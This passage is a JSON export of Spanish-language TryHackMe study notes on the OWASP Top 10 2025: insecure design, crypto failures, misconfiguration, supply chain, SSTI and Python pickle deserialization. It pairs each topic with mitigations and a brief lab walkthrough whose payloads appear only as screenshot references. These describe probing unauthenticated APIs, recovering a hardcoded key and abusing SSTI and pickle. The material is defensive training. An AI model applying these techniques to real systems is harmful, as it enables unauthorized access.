    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/4. AS06 - Insecure Design.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
    "content": "<h2>¬øQu√© es?</h2>\nEl dise√±o inseguro ocurre cuando se construye un sistema con un fallo de l√≥gica o arquitectura. Estas debilidades van desde saltarse el modelado de amenazas o no requerimientos/comprobaciones de dise√±o hasta errores accidentales.\n\nAdem√°s, con la introducci√≥n de modelaje con asistentes de IA, estos exacerban estos dise√±os inseguros. Los desarrolladores suelen asumir que los modelos son seguros, correctos o que su c√≥digo no tiene fallos. Nada m√°s lejos de la realidad.\n\n---------------------------------------\n<h2>Ejemplo</h2>\nUn buen ejemplo es Clubhouse. Su dise√±o temprano asum√≠a que los usuarios s√≥lo interactuar√≠an a trav√©s de la app de m√≥vil, por lo que el backend API no contaba con autentificaci√≥n adecuada. Cualquiera pod√≠a mandar queries para obtener informaci√≥n de usuarios, rooms e incluso conversaciones privadas.\n\n---------------------------------------------\n<h2>¬øPor qu√© importa?</h2>\nNo puedes parchear un dise√±o inseguro, est√° construido en el workflow, la l√≥gica y las fronteras de confianza. Arreglarlo implica repensar c√≥mo los sistemas (y ahora la IA tambi√©n) toman las decisiones.\n\n-----------------------------------\n<h2>Dise√±o Inseguro en 2025</h2>\n- Controles de l√≥gica de negocio d√©biles.\n- Asunci√≥n err√≥neas sobre el comportamiento del usuario/modelo.\n- Componentes IA sin autoridad o acceso adecuado.\n- Guardas faltantes para agentes LLM y de automatizaci√≥n.\n- Bypasses de testeo o debug dejados en producci√≥n.\n- Reviews de casos de abuso o modelos de amenaza IA inconsistentes.\n\n---------------------------------------\n<h2>Dise√±o Inseguro en la Era de la IA</h2>\nLa IA introduce nuevos tipos de fallos de dise√±o. Por ejemplo, la inyecci√≥n de prompts ocurre cuando el input de un usuario se mezcla con prompts de sistema. La confianza ciega en el output del modelo crea sistemas fr√°giles que act√∫an con decisiones de IA sin validaci√≥n. Cuando se trata de modelos envenenados, tomados de fuentes no verificadas, pueden contener comportamientos ocultos o backdoors que comprometan el sistema desde dentro.\n\n------------------------------------\n<h2>¬øC√≥mo dise√±ar de forma segura?</h2>\n- Trata cada modelos como no fiable hasta demostrar lo contrario.\n- Valida y filtra todos los inputs y outputs para asegurar precisi√≥n e integridad.\n- Separa los prompts de sistema del contenido del usuario.\n- Mant√©n la informaci√≥n sensible fuera de prompts a no ser que sea absolutamente necesario y en tal caso prot√©gela de manera estricta.\n- Usa revisi√≥n humana para acciones de IA de alto riesgo.\n- Registra la proveniencia del modelo y el comportamiento y aplica privacidad diferencial para informaci√≥n sensible.\n- Incluye modelos de amenaza espec√≠ficos de IA para ataques de prompts, mal uso del agente y cadena de suministro.\n- Construye el modelado de amenazas durante todas las fases del desarrollo, no s√≥lo al inicio.\n- Define requerimientos de seguridad claros para cada funcionalidad antes de su implementaci√≥n.\n- Aplica el principio de los menores privilegios en usuario, APIs y servicios.\n- Asegura autentificaci√≥n, autorizaci√≥n y manejo de sesiones adecuadas a lo largo del sistema.\n- Mant√©n verificadas las dependencias, componentes de terceros y recursos de la cadena de suministro.\n- Monitoriza y testea el sistema continuamente en busca de fallos de l√≥gica, paths de abuso y riesgos emergentes.\n\n------------------------------------------------\n<h2>Reto</h2>\nNavega al puerto `5005` de la IP dada. ¬øHan asumido que s√≥lo dispositivos m√≥viles pueden acceder?\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251219162451.png]]\n2. Sabemos que hay una api as√≠ que vamos a probar a mandar un escaneo a `/api`.\n   ![[Pasted image 20251219164328.png]]\n3. Vemos el endpoint `/users` as√≠ que vamos a ver qu√© hay en √©l.\n   ![[Pasted image 20251219163852.png]]\n4. Haciendo un poco de ejercicio mental, nos hablan de mensajes, pero no hay mensajes por ning√∫n lado. Tenemos los usuarios, por lo que probaremos a ver si en el directorio `/messages` hay algo, aunque no lo hayamos encontrado en el escaneo.\n   ![[Pasted image 20251219163933.png]]",
    "modified": "2025-12-20T01:49:23"
  },
  {
    "title": "3. AS04 - Cryptographic Failures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/3-as04-cryptographic-failures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/3. AS04 - Cryptographic Failures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
    "content": "<h2>¬øQu√© es?</h2>\nLos errores de criptograf√≠a ocurren cuando la encriptaci√≥n se usa mal o ni siquiera se usa. Esto incluye algoritmos d√©biles, claves hardcodeadas, manejo d√©bil de claves o informaci√≥n sensible sin encriptar.\n\n--------------------------------------\n<h2>¬øPor qu√© importa?</h2>\nLas aplicaciones web usan la criptograf√≠a en todos lados: para proteger el tr√°fico de red, para asegurar la informaci√≥n almacenada, verificar identidades y para guardar secretos. Cuando estos controles fallan, la informaci√≥n sensible puede ser expuesta conllevando tomas de posesi√≥n de cuentas o brechas de seguridad a gran escala.\n\n------------------------------------\n<h2>Patrones Comunes</h2>\n- Usar algoritmos d√©biles o deprecados como MD5, SHA-1 o ECB.\n- Secretos hardcodeados en c√≥digo o configuraci√≥n.\n- Pr√°cticas pobres de rotaci√≥n de claves.\n- Falta de encriptaci√≥n de datos sensibles ya sean guardados o en tr√°nsito.\n- Certificados TLS inv√°lidos o autofirmados.\n- Usar sistemas AI/ML sin manejo adecuado de secretos para inputs sensibles.\n\n----------------------------\n<h2>C√≥mo Prevenirlo</h2>\n- Usa algoritmos modernos y fuertes como AES-GCM, ChaCha20-Poly1305, o TLS 1.3 con certificados v√°lidos.\n- Usa servicios de manejo de claves seguros como Azure Key Vault, AWS KMS o HashiCorp Vault.\n- Rota los secretos y claves regularmente, siguiendo periodos crypto definidos.\n- Documenta y refuerza pol√≠ticas y procedimientos est√°ndar para el manejo del ciclo de vida de las claves.\n- Mant√©n un inventario completo de certificados, claves y sus propietarios.\n- Aseg√∫rate de que los modelos de IA y agentes de automatizaci√≥n no expongan secretos no encriptados o informaci√≥n sensible.\n\n--------------------------------------------\n<h2>Reto</h2>\nNavega hasta el puerto `5004` de la IP dada. ¬øPuedes encontrar la clave para descifrar el archivo?\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251219142626.png]]\n2. Vamos a leer el c√≥digo fuente.\n   ![[Pasted image 20251219142713.png]]\n   Parece que hay un JavaScript para desencriptar el archivo: `/static/js/decrypt.js`.\n3. Lo leemos.\n   ![[Pasted image 20251219142822.png]]\n   Hemos encontrado la clave secreta.\n4. Para desencriptarlo vamos a CyberChef.\n\t1. A√±adimos lo encriptado en el input.\n\t   ![[Pasted image 20251219143725.png]]\n\t2. Cargamos el m√≥dulo AES Decrypt y configuramos la clave,  ECB y Raw tanto como input como output.\n\t   ![[Pasted image 20251219144034.png]]\n\t   Esto ocurre porque el input no es Raw, sino base64.\n\t3. Le a√±adimos From Base64.\n\t   ![[Pasted image 20251219144121.png]]",
    "modified": "2025-12-20T01:49:23"
  },
  {
    "title": "1. AS02 - Security Missconfigurations",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/1-as02-security-missconfigurations/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/1. AS02 - Security Missconfigurations.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
    "content": "<h2>¬øQu√© es?</h2>\nLas malas configuraciones de seguridad aparecen cuando el sistema, servidores o aplicaciones se despliegan con valores por defecto inseguros, configuraciones incompletas o servicios expuestos. No son bugs de c√≥digo sino errores en c√≥mo el entorno, software o red se configuran.\n\n--------------------------------------\n<h2>¬øPor qu√© importa?</h2>\nIncluso peque√±as malas configuraciones pueden exponer informaci√≥n sensible, habilitar escalada de privilegios o darle a los atacantes un pie dentro del sistema. Las aplicaciones modernas conf√≠an en stacks complejos, servicios de nube y APIs de terceros. Un s√≥lo panel administrativo expuesto, un bucket de almacenamiento abierto o permisos mal configurados pueden comprometer el sistema entero.\n\n-------------------------------------------\n<h2>Ejemplo</h2>\nEn 2017, Uber expuso un bucket AWS S3 de backup con informaci√≥n sensible de usuarios, incluyendo informaci√≥n de conductores y riders porque el bucket era accesible p√∫blicamente. Esto muestra que un error de despliegue puede llevar a una brecha importante.\n\n------------------------------------\n<h2>Patrones Comunes</h2>\n- Credenciales por defecto o contrase√±a d√©bil sin cambiar.\n- Servicios o endpoints innecesarios expuestos a internet.\n- Permisos o almacenamiento en nube mal configurado (S3, Azure Blob, GCP buckets).\n- Acceso no restringido a APIs o falta de autentificaci√≥n/autorizaci√≥n.\n- Muestra de mensajes de error exponiendo trazas del stack o detalles de sistema.\n- Software, frameworks o contenedores desactualizados con vulnerabilidades conocidas.\n- Endpoints AI/ML expuestos sin controles de acceso adecuados.\n\n----------------------------\n<h2>C√≥mo Prevenirlo</h2>\n- Reforzar configuraciones por defecto y borrar servicios y funcionalidades no utilizados.\n- Reforzar una autentificaci√≥n fuerte y los menores privilegios a lo largo del sistema.\n- Limitar la exposici√≥n de red y recursos sensibles.\n- Mantener el software, frameworks y contenedores actualizados.\n- Esconder mensajes de error para evitar revelar informaci√≥n de m√°s.\n- Auditar configuraciones de nube y permisos de forma regular.\n- Securizar los endpoints AI y servicios de automatizaci√≥n con controles de acceso y monitorizaci√≥n adecuada.\n- Integrar comprobaciones de configuraci√≥n y seguridad en el proceso de despliegue.\n\n----------------------------------------\n<h2>Reto</h2>\nNavega hasta el puerto `5002` de la IP dada. Parece que los desarrolladores se dejaron bastantes trazas en sus APIs de Control de Usuarios.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251219102758.png]]\n2. Hacemos lo que nos dice para interactuar con la API.\n   ![[Pasted image 20251219102859.png]]\n3. Vamos probando y con n√∫meros positivos y `0` no vemos nada, por lo que probamos un n√∫mero que creemos que dar√° un error (`-1`).\n   ![[Pasted image 20251219103021.png]]",
    "modified": "2025-12-20T01:49:23"
  },
  {
    "title": "2. AS03 - Software Supply Chain Failures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/2-owasp-top-10-2025-application-design-flaws/2-as03-software-supply-chain-failures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/2. OWASP Top 10 2025 - Application Design Flaws/2. AS03 - Software Supply Chain Failures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 2. OWASP Top 10 2025 - Application Design Flaws",
    "content": "<h2>¬øQu√© es?</h2>\nLos fallos en la cadena de suministro de software ocurren cuando las aplicaciones conf√≠an en componentes, librer√≠as, servicios o modelos comprometidos, desactualizados o sin verificaci√≥n adecuada. Estas debilidades no son inherentes al c√≥digo, sino a las herramientas y software del que depende.\n\n--------------------------------------\n<h2>¬øPor qu√© importa?</h2>\nLas aplicaciones modernas est√°n construidas a partir de paquetes, APIs y modelos de IA de terceros. Una dependencia comprometida puede comprometer el sistema completo, permitiendo a los atacantes ganar acceso sin tocar tu c√≥digo. Adem√°s este tipo de ataque puede ser automatizado y distribuido.\n\n-------------------------------------------\n<h2>Ejemplo</h2>\nEn 2021, SolarWinds fue comprometida y esto mostr√≥ el peligro de este tipo de ataques. Los atacantes insertaron c√≥digo malicioso en una actualizaci√≥n confiable, afectando a miles de organizaciones que inmediatamente la instalaron. No fue un bug en la l√≥gica del c√≥digo, sino una debilidad en el proceso de construcci√≥n de actualizaciones, verificaci√≥n y distribuci√≥n.\n\n------------------------------------\n<h2>Patrones Comunes</h2>\n- Usar librer√≠as o dependencias sin verificar o no mantenidas.\n- Instalar autom√°ticamente actualizaciones sin verificaci√≥n.\n- Sobredependencia de modelos IA de terceros sin auditor√≠a.\n- Procesos de montaje inseguros o procesos CI/CD que permiten manipulaci√≥n.\n- Falta de supervisi√≥n de vulnerabilidades en las dependencias implementadas.\n- Rastreo deficiente de licencias o procedencia de los componentes.\n\n----------------------------\n<h2>C√≥mo Prevenirlo</h2>\n- Verifica todos los componentes, librer√≠as y modelos IA de terceros antes de usarlos.\n- Monitoriza y parchea las dependencias de forma regular.\n- Firma, verifica y audita las actualizaciones de software y paquetes.\n- Cierra a conciencia los procesos CI/CD y construcci√≥n para prevenir la manipulaci√≥n.\n- Rastrea el origen y licencias de las dependencias.\n- Implementa monitorizaci√≥n de tiempo de ejecuci√≥n para comportamiento inusual de dependencias o componentes IA.\n- Integra modelos de amenazas de cadena en el SDLC incluyendo testing, despliegue y workflows de actualizaciones.\n\n--------------------------------------------\n<h2>Reto</h2>\nNavega al puerto `5003` de la IP dada. El c√≥digo est√° desactualizado e importa un componente viejo: `lib/vulnerable_utils.py`. ¬øPuedes debuggearlo?\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251219123146.png]]\n2. Interceptamos la petici√≥n al endpoint `/api/process`.\n   ![[Pasted image 20251219124029.png]]\n3. Cambiamos el m√©todo a POST, metemos un JSON con el campo `data` con un texto cualquiera y cambiamos el `Content-Type`.\n   ![[Pasted image 20251219124223.png]]\n4. No sabemos lo que mandar as√≠ que leeremos el archivo que nos dan en la tarea.\n   ![[Pasted image 20251219125858.png]]\n   Sobre la linea 23 podemos ver informaci√≥n relevante.\n5. Vamos a proceder a mandar la palabra `debug`.\n   ![[Pasted image 20251219130011.png]]",
    "modified": "2025-12-20T01:49:23"
  },
  {
    "title": "0. OWASP Top 10 2025 - Insecure Data Handling",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/0-owasp-top-10-2025-insecure-data-handling/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/0. OWASP Top 10 2025 - Insecure Data Handling.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
    "content": "[[1. A04 - Cryptographic Failures]]\n[[2. A05 - Injection]]\n[[3. A08 - Software or Data Integrity Failures]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. A05 - Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/2-a05-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/2. A05 - Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
    "content": "La inyecci√≥n ha sido una funcionalidad permanente en el OWASP Top 10. Es el ejemplo cl√°sico de explotaci√≥n web.\n\n---------------------------------\n<h2>¬øQu√© es la inyecci√≥n?</h2>\nLa inyecci√≥n ocurre cuando una aplicaci√≥n toma input del usuario y no lo maneja de forma adecuada. En lugar de procesarlo de forma segura, la aplicaci√≥n lo pasa directamente al sistema que puede ejecutar comandos o queries.\n\nYa estar√°s familiarizado con SQL Injection, donde un  atacante inserta una query SQL en la l√≥gica de la aplicaci√≥n, como un formulario de login que es procesado por la base de datos. Esto pasa cuando la aplicaci√≥n web no sanitiza su input. Los siguientes son algunos ejemplos cl√°sicos de inyecci√≥n:\n\n- SQL Injection\n- Command Injection\n- AI Prompts\n- Server Side Template Injection (SSTI)\n\nDesafortunadamente, este tipo de ataques sigue siendo relevante.\n\n-----------------------------------------\n<h2>¬øC√≥mo prevenir la inyecci√≥n?</h2>\nLa prevenci√≥n de inyecci√≥n comienza por asegurarse de que el input del usuario sea siempre sanitizado y no confiado. Para las queries SQL significa usar prepared statements y queries parametrizadas en lugar de usar concatenaci√≥n. Para comandos del sistema operativo, evita funciones que pasen el input directamente a la shell del sistema y en su lugar conf√≠a en APIs seguras y procesos que no llamen a la consola.\n\nLa validaci√≥n y sanitizaci√≥n del input juega un papel crucial en prevenir este tipo de ataques.\n\n------------------------------------\n<h2>Pr√°ctica</h2>\nEste ejemplo ilustra Server Side Template Injection (SSTI). Debes abusar la habilidad de la aplicaci√≥n de renderizar contenido din√°mico para obtener la flag. Navega al puerto `8000` de la IP dada.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251219180426.png]]\n2. Probamos diferentes payloads.\n   ![[Pasted image 20251219180727.png]]\n3. La llamada `request.application` lleva a Flask Internals, dej√°ndonos alcanzar el namespace `__builtins__` y llamar a `open()`.\n   ![[Pasted image 20251219181019.png]]",
    "modified": "2025-12-20T01:49:23"
  },
  {
    "title": "1. A04 - Cryptographic Failures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/1-a04-cryptographic-failures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/1. A04 - Cryptographic Failures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
    "content": "Los fallos criptogr√°ficos tienen otra aparici√≥n en esta lista OWASP Top 10. Exploremos qu√© es exactamente y algunas medidas de mitigaci√≥n.\n\n-----------------------------\n<h2>¬øQu√© son los fallos criptogr√°ficos?</h2>\nOcurren cuando la informaci√≥n sensible no est√° protegida adecuadamente debido a la falta de encriptaci√≥n, implementaci√≥n defectuosa o medidas de seguridad insuficientes. Esto incluye guardar contrase√±as sin hashear, usar algoritmos d√©biles o desactualizados (como MD5, SHA-1 o DES), exponer claves de cifrado o fallar al intentar asegurar la informaci√≥n durante su transmisi√≥n.\n\n-------------------------------------------\n<h2>¬øC√≥mo prevenir fallos criptogr√°ficos?</h2>\n Prevenir fallos criptogr√°ficos comienza con elegir algoritmos fuertes y modernos e implementarlos correctamente. La informaci√≥n sensible como contrase√±as deber√≠a ser robustamente hasheada con funciones como bcrypt, scrypt o Argon2. Al encriptar informaci√≥n evita usar tus propios algoritmos, usa los que ya son buenos y fuertes.\n \nNunca incrustes credenciales en c√≥digo fuente, en su lugar, usa un sistema seguro de manejo de claves o entornos espec√≠ficamente dise√±ados para guardar secrets.\n\n---------------------------------------\n<h2>Pr√°ctica</h2>\nVe al puerto `8081` de la IP dada. Esta aplicaci√≥n web demuestra un servicio de compartir notas que usa un derivado compartido y d√©bil de una clave para proteger las notas.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251219174941.png]]\n   C√≥mo va a ser una clave de 4 d√≠gitos y te dicen los 3 primeros.\n2. Probamos con los n√∫meros del 0-9.\n   ![[Pasted image 20251219175353.png]]",
    "modified": "2025-12-20T01:49:23"
  },
  {
    "title": "3. A08 - Software or Data Integrity Failures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/5-owasp-top-10-2025/3-owasp-top-10-2025-insecure-data-handling/3-a08-software-or-data-integrity-failures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/5. OWASP Top 10 - 2025/3. OWASP Top 10 2025 - Insecure Data Handling/3. A08 - Software or Data Integrity Failures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 5. OWASP Top 10 - 2025 > 3. OWASP Top 10 2025 - Insecure Data Handling",
    "content": "De nuevo, los fallos de integridad de la informaci√≥n o del software llevan un largo tiempo en el OWASP Top 10.\n\n-------------------------------------\n<h2>¬øQu√© son los fallos de Integridad del Software o la Informaci√≥n?</h2>\nOcurren cuando una aplicaci√≥n depende del c√≥digo, actualizaciones o informaci√≥n que asume que es segura sin verificar su autenticidad, integridad u origen. Esto incluye confiar en actualizaciones de software sin verificar, cargar script o archivos de configuraci√≥n de fuentes no confiables, fallar al validar la informaci√≥n que impacta la l√≥gica de la aplicaci√≥n o aceptar informaci√≥n como binarios, plantillas o archivos JSON sin confirmar si han sido o no alterados.\n\n----------------------------------------\n<h2>¬øC√≥mo evitar estos fallos?</h2>\nPrevenir estos fallos comienza por establecer fronteras de confianza. Las aplicaciones nunca deber√≠an asumir que el c√≥digo, actualizaciones o piezas clave de informaci√≥n son leg√≠timas y confiadas autom√°ticamente; las integridad debe ser verificada. Esto incluye m√©todos como checksums para actualizar paquetes y asegurar que s√≥lo fuentes confiables puedan modificar artefactos cr√≠ticos.\n\n------------------------------------------\n<h2>Pr√°ctica</h2>\nEsta pr√°ctica mostrar√° la deserializaci√≥n en Python. Navega hasta el puerto `8002` de la IP dada.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251219181807.png]]\n2. Usamos python para generar un payload malicioso en pickle.\n   ![[Pasted image 20251219182012.png]]\n   ![[Pasted image 20251219182100.png]]\n3. Lo pegamos y obtenemos la flag.\n   ![[Pasted image 20251219182128.png]]",
    "modified": "2025-12-20T01:49:23"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/4-burp-suite-other-modules/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/4. Burp Suite - Other Modules/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 4. Burp Suite -> 4. Burp Suite - Other Modules**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Other Modules",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/4-burp-suite-other-modules/0-burp-suite-other-modules/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/4. Burp Suite - Other Modules/0. Burp Suite - Other Modules.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/0. Burp Suite - Other Modules]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/4. Burp Suite - Other Modules/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/5-burp-suite-extensions/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/5. Burp Suite - Extensions/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 5. Burp Suite - Extensions",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 4. Burp Suite -> 5. Burp Suite - Extensions**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Extensions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/5-burp-suite-extensions/0-burp-suite-extensions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/5. Burp Suite - Extensions/0. Burp Suite - Extensions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 5. Burp Suite - Extensions",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/5. Burp Suite - Extensions/0. Burp Suite - Extensions]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/5. Burp Suite - Extensions/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Repeater",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/2-burp-suite-repeater/0-burp-suite-repeater/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/2. Burp Suite - Repeater/0. Burp Suite - Repeater.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 2. Burp Suite - Repeater",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/0. Burp Suite - Repeater]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/2. Burp Suite - Repeater/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/2-burp-suite-repeater/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/2. Burp Suite - Repeater/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 2. Burp Suite - Repeater",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 4. Burp Suite -> 2. Burp Suite - Repeater**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/3-burp-suite-intruder/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/3. Burp Suite - Intruder/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 3. Burp Suite - Intruder",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 4. Burp Suite -> 3. Burp Suite - Intruder**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Intruder",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/3-burp-suite-intruder/0-burp-suite-intruder/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/3. Burp Suite - Intruder/0. Burp Suite - Intruder.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 3. Burp Suite - Intruder",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/0. Burp Suite - Intruder]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/3. Burp Suite - Intruder/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - The Basics",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/1-burp-suite-the-basics/0-burp-suite-the-basics/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/1. Burp Suite - The Basics/0. Burp Suite - The Basics.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 1. Burp Suite - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/0. Burp Suite - The Basics]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/1. Burp Suite - The Basics/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/3-burp-suite/1-burp-suite-the-basics/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/3. Burp Suite/1. Burp Suite - The Basics/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 3. Burp Suite > 1. Burp Suite - The Basics",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 8. Web Hacking -> 4. Burp Suite - The Basics**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/1-how-the-web-works/3-how-websites-work/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/1. How The Web Works/3. How Websites Work/1. Redireccion.md",
